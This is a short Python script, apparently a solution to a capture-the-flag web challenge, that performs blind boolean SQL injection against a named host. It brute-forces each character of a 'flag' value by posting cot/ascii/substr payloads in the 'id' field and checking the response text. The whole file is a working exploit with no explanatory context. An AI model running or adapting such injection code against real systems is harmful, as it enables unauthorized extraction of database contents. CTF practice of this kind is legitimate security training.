import requests

url = "http://web43.buuoj.cn/index.php"

result = ''
for i in range(1, 38):
    for j in range(0, 256):
        payload = '1^(cot(ascii(substr((select(flag)from(flag)),' + str(i) + ',1))>' + str(j) + '))^1=1'
        print(payload)
        r = requests.post(url, data = {'id': payload})

        if r.text.find('girl') == -1:
            result += chr(j)
            print(j)
            break

print(result)
